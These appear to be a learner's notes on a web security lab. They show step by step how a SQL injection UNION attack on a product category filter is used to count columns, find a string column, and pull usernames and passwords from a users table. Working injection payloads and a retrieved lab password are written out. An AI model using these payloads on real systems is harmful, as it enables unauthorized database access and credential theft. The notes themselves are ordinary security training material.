


## Endgoal = perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
but here only one column is displayed



## Burp

GET /filter?category=Gifts HTTP/2


## finding number of column

`gifts' union select null , null , null .... --`


-> we found the number of columns to be = 2


## findind column with string datatype


`gifts' union select 'a' , null--`
`gifts' union select null,'a' --`


we found second column is of string data type



## retrieving username and password
since there is only one column of string datatype , we have to output username and password one by one


--> retreiving username
`gifts' union select null,username from users --`

![[../../images/Pasted image 20231103001816.png]]

--> retreiving password
`gifts' union select null,password from users --`

![[../../images/Pasted image 20231103001845.png]]

password = k67hen3dutggsktkz2as







